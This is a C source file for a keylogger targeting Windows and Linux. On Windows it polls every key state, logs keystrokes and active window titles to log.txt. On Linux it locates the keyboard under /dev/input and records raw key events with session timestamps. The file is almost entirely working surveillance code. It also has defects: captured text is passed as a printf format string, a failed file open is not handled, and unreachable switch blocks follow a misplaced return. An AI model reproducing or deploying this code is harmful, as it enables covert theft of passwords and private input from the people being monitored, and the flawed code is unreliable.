//
// Created by mallo on 13/12/2022.
//

#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include "keylogger.h"

int running = 1;

void quitHandler(int sig){
    running = 0;
}

#if defined PLATFORM_WINDOWS
    #include <windows.h>
    #define BUFLEN 4096 /* dimensione buffer di appoggio */

    HWND wincurrent, winlast;
    unsigned char string[256];
    unsigned char buffer[BUFLEN];

    void searchActiveWindow(void) {
        wincurrent = GetForegroundWindow();
        if(wincurrent != winlast) {
            winlast = wincurrent;
            int err = GetWindowText(wincurrent, string, 256); /* primo metodo */
            if(err != 0) {
                if(strlen(string) == 0) sprintf( buffer, "\r\n[>>> ??? <<<]");
                else sprintf(buffer, "\r\n[>>> %.256s <<<]",string);
            }
             /* non ha funzionato... secondo metodo */
            else {
                SendMessage(wincurrent, WM_GETTEXT, (WPARAM)256, (LPARAM)string);
                if(strlen(string) == 0) sprintf( buffer, "\r\n[>>> ??? <<<]");
                else sprintf(buffer, "\r\n[>>> %.256s <<<]", string);
            }
        }
    }

    void table(unsigned char key_number)
    {
        if((key_number>=0x30)&&(key_number<=0x39)) /* numeri */
        {
            sprintf(string,"\r\n%c",key_number);
            return;
        }

        if((key_number>=0x41)&&(key_number<=0x5A)) /* caratteri maiuscoli/minuscoli */
        {
            if((GetKeyState(VK_CAPITAL)>0) || (GetKeyState(VK_SHIFT)&8000)) sprintf(string,"\r\n%c",key_number);
            else sprintf(string,"\r\n%c",key_number+0x20);
            return;
        }

        switch(key_number) /* pulsanti del mouse */
        {
            case VK_LBUTTON: sprintf(string,"\r\nMOUSE LEFT");return;
            case VK_MBUTTON: sprintf(string,"\r\nMOUSE MIDDLE");return;
            case VK_RBUTTON: sprintf(string,"\r\nMOUSE RIGHT");return;
        }

        switch(key_number) /* tasti speciali */
        {
            case VK_ESCAPE: sprintf(string,"\r\nESC");return;
            case VK_NEXT: sprintf(string,"\r\nPAGDOWN");return;
            case VK_END: sprintf(string,"\r\nEND");return;
            case VK_PRIOR: sprintf(string,"\r\nPAGUP");return;
            case VK_HOME: sprintf(string,"\r\nHOME");return;
            case VK_LEFT: sprintf(string,"\r\nLEFT");return;
            case VK_UP: sprintf(string,"\r\nUP");return;
            case VK_RIGHT: sprintf(string,"\r\nRIGHT");return;
            case VK_DOWN: sprintf(string,"\r\nDOWN");return;
            case VK_INSERT: sprintf(string,"\r\nINS");return;
            case VK_DELETE: sprintf(string,"\r\nDEL");return;
            case VK_SPACE: sprintf(string,"\r\nSPACE");return;
            case VK_RETURN: sprintf(string,"\r\nENTER");return;
            case VK_BACK: sprintf(string,"\r\nBACKSPACE");return;
            case VK_LSHIFT: sprintf(string,"\r\nLEFTSHIFT");return;
            case VK_RSHIFT: sprintf(string,"\r\nRIGHTSHIFT");return;
            case VK_LCONTROL: sprintf(string,"\r\nLEFTCONTROL");return;
            case VK_RCONTROL: sprintf(string,"\r\nRIGHTCONTROL");return;
            case VK_TAB: sprintf(string,"\r\nTAB");return;
        }

        sprintf(string,"\r\nUNRECOGNIZED");
        return;
    }

    void keylogger(int keyboard, int writeout) {
        FILE* dump;
        signal(SIGINT, quitHandler);
        signal(SIGTERM, quitHandler);

        while(running) {
            for (int i = 0; i < 256; i++) {
                char key = GetAsyncKeyState(i);
                if (key > 0) {
                    table(i);
                    if(dump = fopen("log.txt","ab+")) {
                        printf("File aperto!");
                    }
                    fprintf(dump, string);
                    fclose(dump);
                    break;
                }
            }
            searchActiveWindow();
            Sleep(10); /* previene la saturazione della CPU */
        }
    }
#endif

#if defined(PLATFORM_LINUX)
    #include <linux/input.h>
    #include <sys/ioctl.h>

    #define INPUT_DIR "/dev/input/"
    #define NUM_EVENTS 128
    #define STANDARD_KEY_COUNT 84

    int eventSize = sizeof(struct input_event);
    struct input_event events[NUM_EVENTS];
    unsigned char string[256];
    int i;

    const char *standardKeyCodes[] = {
            "RESERVED","ESC",
            "1","2","3","4","5","6","7","8","9","0",
            "MINUS","EQUAL","BACKSPACE","TAB",
            "q","w","e","r","t","y","u","i","o","p",
            "LEFTBRACE","RIGHTBRACE","ENTER","LEFTCTRL",
            "a","s","d","f","g","h","j","k","l",
            "SEMICOLON","APOSTROPHE","GRAVE","LEFTSHIFT","BACKSLASH",
            "z","x","c","v","b","n","m",
            "COMMA","DOT","SLASH","RIGHTSHIFT","ASTERISK","LEFTALT","SPACE","CAPSLOCK",
            "F1","F2","F3","F4","F5","F6","F7","F8","F9","F10",
            "NUMLOCK","SCROLLLOCK",
            "7", "8", "9", "MINUS", "4", "5", "6",
            "PLUS", "1", "2", "3", "0", "DOT"
    };

    int bytesRead = 0;

    static int is_char_device(const struct dirent *file){
        struct stat filestat;
        char filename[512];
        int err;

        snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, file->d_name);

        err = stat(filename, &filestat);
        if(err){
            return 0;
        }

        return S_ISCHR(filestat.st_mode);
    }

    // Some of this implementation is based on lessons learned from the following:
    // http://unix.stackexchange.com/questions/94322/is-it-possible-for-a-daemon-i-e-background-process-to-look-for-key-presses-fr/94329#94329
    char *get_keyboard_event_file(void){
        char *keyboard_file = NULL;
        int num, i;
        struct dirent **event_files;
        char filename[512];

        num = scandir(INPUT_DIR, &event_files, &is_char_device, &alphasort);
        if(num < 0){
            return NULL;
        }

        else {
            for(i = 0; i < num; ++i){
                int32_t event_bitmap = 0;
                int fd;
                int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

                snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, event_files[i]->d_name);
                fd = open(filename, O_RDONLY);

                if(fd == -1){
                    perror("open");
                    continue;
                }

                ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
                if((EV_KEY & event_bitmap) == EV_KEY){
                    // The device acts like a keyboard

                    ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                    if((kbd_bitmap & event_bitmap) == kbd_bitmap){
                        // The device supports A, B, C, Z keys, so it probably is a keyboard
                        keyboard_file = strdup(filename);
                        close(fd);
                        break;
                    }

                }
                close(fd);
            }
        }

        // Cleanup scandir
        for(i = 0; i < num; ++i){
            free(event_files[i]);
        }

        free(event_files);

        return keyboard_file;

    }

    void convert(int keyCode) {
        if(keyCode > 0 && keyCode < STANDARD_KEY_COUNT)
            sprintf(string,"\r\n%s", standardKeyCodes[keyCode]); return;

        switch (keyCode) { /* Special characters */
            case KEY_F11: sprintf(string,"\r\n%s", "F11"); return;
            case KEY_F12: sprintf(string,"\r\n%s", "F12"); return;
            case KEY_KPENTER: sprintf(string,"\r\n%s", "ENTER"); return;
            case KEY_KPSLASH: sprintf(string,"\r\n%s", "SLASH"); return;
            case KEY_RIGHTALT: sprintf(string,"\r\n%s", "RIGHTALT"); return;
            case KEY_RIGHTCTRL: sprintf(string,"\r\n%s", "RIGHTCONTROL"); return;
        }

        switch (keyCode) { /* Arrows */
            case KEY_UP: sprintf(string,"\r\n%s", "UP"); return;
            case KEY_LEFT: sprintf(string,"\r\n%s", "LEFT"); return;
            case KEY_RIGHT: sprintf(string,"\r\n%s", "RIGHT"); return;
            case KEY_DOWN: sprintf(string,"\r\n%s", "DOWN"); return;
        }

        sprintf(string,"\r\nUNRECOGNIZED: %d", keyCode); return;
    }

    void keylogger(int keyboard, FILE* writeout) {
        signal(SIGINT, quitHandler);
        signal(SIGTERM, quitHandler);

        time_t t = time(NULL);
        struct tm tm = *localtime(&t);

        fprintf(writeout,
                "\nLOGGING SESSION START: %d-%02d-%02d %02d:%02d:%02d "
                "\nPLATFORM: LINUX\nCODEC: see linux/input.h",
                tm.tm_year + 1900,
                tm.tm_mon + 1,
                tm.tm_mday,
                tm.tm_hour,
                tm.tm_min,
                tm.tm_sec);

        while(running){
            bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);

            for(i = 0; i < (bytesRead / eventSize); ++i){
                if(events[i].type == EV_KEY){
                    if(events[i].value == 1){
                        convert(events[i].code);
                        fprintf(writeout, string);
                    }
                }
            }
        }

        t = time(NULL);
        tm = *localtime(&t);
        fprintf(writeout, "\nLOGGING SESSION END: %d-%02d-%02d %02d:%02d:%02d",
                tm.tm_year + 1900,
                tm.tm_mon + 1,
                tm.tm_mday,
                tm.tm_hour,
                tm.tm_min,
                tm.tm_sec);
    }
#endif



